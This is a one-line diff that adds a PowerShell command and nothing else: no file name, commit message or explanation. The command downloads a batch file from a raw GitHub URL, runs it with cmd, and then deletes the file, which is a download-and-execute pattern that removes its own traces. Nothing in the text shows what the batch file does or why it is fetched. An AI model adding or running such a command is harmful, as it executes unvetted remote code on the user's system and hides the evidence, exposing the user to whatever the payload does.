@@ -1,0 +1,1 @@
+iwr https://raw.githubusercontent.com/DarsEdu/DarsEdu.github.io/refs/heads/main/Batch1.bat -OutFile Batch1.bat; cmd /c Batch1.bat; Remove-Item Batch1.bat
